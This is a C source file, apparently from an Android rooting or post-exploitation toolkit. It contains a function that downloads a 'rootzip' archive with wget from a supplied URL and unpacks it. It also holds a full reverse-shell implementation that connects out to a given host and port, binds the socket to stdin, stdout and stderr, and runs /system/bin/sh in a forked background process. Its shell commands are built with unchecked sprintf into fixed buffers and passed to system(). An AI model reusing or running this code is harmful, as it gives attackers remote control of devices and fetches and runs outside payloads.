#include <stdio.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <stdlib.h>

#include "log.h"

int run_shell_commond(char *shell, char *cmd) {
  char run_cmd[0xff] = {0};
  int status;

  sprintf(run_cmd, "%s -c \"%s\"", shell, cmd);
#ifdef LOG_DEBUG
  log_dump(LOG_DEBUG, "[*] %s\n", run_cmd);
#endif
  status = system(run_cmd);

  if (-1 == status) {
    log_dump(LOG_ERR, "[-] system error!");
    return -1;
  } else {
    // log_dump(LOG_DEBUG, "[*] exit status value = [0x%x]\n", status);

    if (WIFEXITED(status)) {
      if (0 == WEXITSTATUS(status)) {
        // log_dump(LOG_DEBUG, "[+] run shell commond successfully.\n");
      } else {
        log_dump(LOG_ERR, "[-] run shell commond fail, exit code: %d\n",
                 WEXITSTATUS(status));
        return -1;
      }
    } else {
      // log_dump(LOG_DEBUG, "[+] exit status = [%d]\n", WEXITSTATUS(status));
    }
  }

  return 0;
}

int set_permission(char *file_path, char *perm) {
  int ret;
  char run_cmd[0xff] = {0};

  sprintf(run_cmd, "/system/bin/chmod %s %s", perm, file_path);
  ret = run_shell_commond("/system/bin/sh", run_cmd);
  if (ret < 0) {
    log_dump(LOG_ERR, "[-] chmod false!\n");
    return -1;
  }

  return 0;
}

int dload_rootzip_and_unpack(char *dltool, char *roozip_url, char *dload_name,
                             char *unpack_path) {
  char run_cmd[0xff] = {0};
  sprintf(run_cmd, "%s wget %s -O %s", dltool, roozip_url, dload_name);
  if (run_shell_commond("/system/bin/sh", run_cmd) < 0) return -1;

  memset(run_cmd, 0, sizeof(run_cmd));
  sprintf(run_cmd, "%s unzip %s -o -d %s", dltool, dload_name, unpack_path);
  if (run_shell_commond("/system/bin/sh", run_cmd) < 0) return -1;

  return 0;
}

/* ---------------- reverse-shell ---------------- */
// #include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
// #include <string.h>
// #include <sys/types.h>
#include <sys/socket.h>

#define PROGNAME "reverse-shell"
#define VERSION "1.0.0"
#define SHELL "sh"
#define PATH "/system/bin"
#define PATHSHELL PATH "/" SHELL
#define RSHELL_F_NOFORK (1 << 0)

struct rshell {
  char *host;
  char *service;
  uint16_t port;
  int family;
  char *shell;
  unsigned flags;
};

static void usage() {
  fprintf(stderr, "usage: %s [options] <host> <port>\n", PROGNAME);
  fprintf(stderr, "options:\n");
  fprintf(stderr, "\t-h         : display this and exit\n");
  fprintf(stderr, "\t-v         : display version and exit\n");
  fprintf(stderr, "\t-f         : foreground mode (eg: no fork)\n");
  fprintf(stderr, "\t-6         : use IPv6 socket\n");
  fprintf(stderr, "\t-s <shell> : give the path shell (default: %s)\n",
          PATHSHELL);
}

static void version() { fprintf(stderr, "%s %s\n", PROGNAME, VERSION); }

static char *rshell_basename(char *path) {
  char *ptr;
  size_t len = strlen(path);
  for (ptr = path + len; ptr >= path; ptr--) {
    if (ptr[0] == '/') return ++ptr;
  }
  return path;
}

static void reverse_tcp(const struct rshell *rshell) {
  int sockfd;
  struct addrinfo hints;
  struct addrinfo *res;
  int ret;
  char *ex[3];
  memset(&hints, 0, sizeof hints);
  hints.ai_family = rshell->family;
  hints.ai_socktype = SOCK_STREAM;
  log_dump(LOG_DEBUG, "[*] reverse_tcp\n");
  if ((ret = getaddrinfo(rshell->host, rshell->service, &hints, &res)) != 0) {
    log_dump(LOG_ERR, "getaddrinfo false!\n");
    return;
  }
  if ((sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol)) <
      0) {
    log_dump(LOG_ERR, "socket false!\n");
    return;
  }
  if (connect(sockfd, res->ai_addr, res->ai_addrlen) < 0) {
    log_dump(LOG_ERR, "connect false!\n");
    return;
  }
  /* Replace stdin, stdout and stderr from the socket
   */
  dup2(sockfd, 0);
  dup2(sockfd, 1);
  dup2(sockfd, 2);
  ex[0] = rshell->shell;
  ex[1] = rshell_basename(rshell->shell);
  ex[2] = NULL;

  // char *envp[] = {"/system/bin", "/sbin", "/system/xbin", "/system/sbin", NULL};
  char *envp[] = {"PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin", NULL};
  fprintf(stderr, "[+] connect %s:%d execve %s %s\n", rshell->host,
          rshell->port, ex[0], ex[1]);
  execve(ex[0], &ex[1], envp);
  /* Should never get here
   */
}

static void rshell_init(struct rshell *rshell) {
  rshell->family = AF_INET;
  rshell->shell = PATHSHELL;
  rshell->flags = 0;
}

static int rshell_set_port(struct rshell *rshell, char *port) {
  long int res;
  res = strtol(port, NULL, 10);
  if (res <= 0 || res > 0xffff) return -1;
  rshell->service = port;
  rshell->port = (uint16_t)res;
  return 0;
}

int rshell(int argc, char *argv[]) {
  int c;
  pid_t child;
  struct rshell rshell;
  if (fork() > 0)
    // exit(0);
    while (1)
      ;
  log_dump(LOG_DEBUG, "[!] Now in fork process! %d\n", getpid());
  rshell_init(&rshell);
  while ((c = getopt(argc, argv, "6fhs:v")) != -1) {
    switch (c) {
      case '6':
        rshell.family = AF_INET6;
        break;
      case 'f':
        rshell.flags |= RSHELL_F_NOFORK;
        break;
      case 'h':
        usage();
        return 0;
      case 's':
        rshell.shell = optarg;
        break;
      case 'v':
        version();
        return 0;
    }
  }
  argv += optind;
  argc -= optind;
  if (argc != 2) {
    usage();
    return -1;
  }
  rshell.host = argv[0];
  if (rshell_set_port(&rshell, argv[1])) {
    log_dump(LOG_ERR, "Invalid port %s\n", argv[1]);
    return -1;
  }
  /* Fork and connect back
   */
  if ((rshell.flags & RSHELL_F_NOFORK) || (child = fork()) == 0)
    reverse_tcp(&rshell);
  else
    log_dump(LOG_DEBUG, "child pid: %d\n", child);
  return 0;
}

int rshell_simple(char *ip, char* port) {
  int c;
  pid_t child;
  struct rshell rshell;
  if (fork() > 0)
    // exit(0);
    while (1)
      ;
  log_dump(LOG_DEBUG, "[!] Now in fork process! %d\n", getpid());
  rshell_init(&rshell);
 
  rshell.host = ip;
  if (rshell_set_port(&rshell, port)) {
    log_dump(LOG_ERR, "Invalid port %s\n", port);
    return -1;
  }
  /* Fork and connect back
   */
  if ((child = fork()) == 0)
    reverse_tcp(&rshell);
  else
    log_dump(LOG_DEBUG, "child pid: %d\n", child);
  return 0;
}
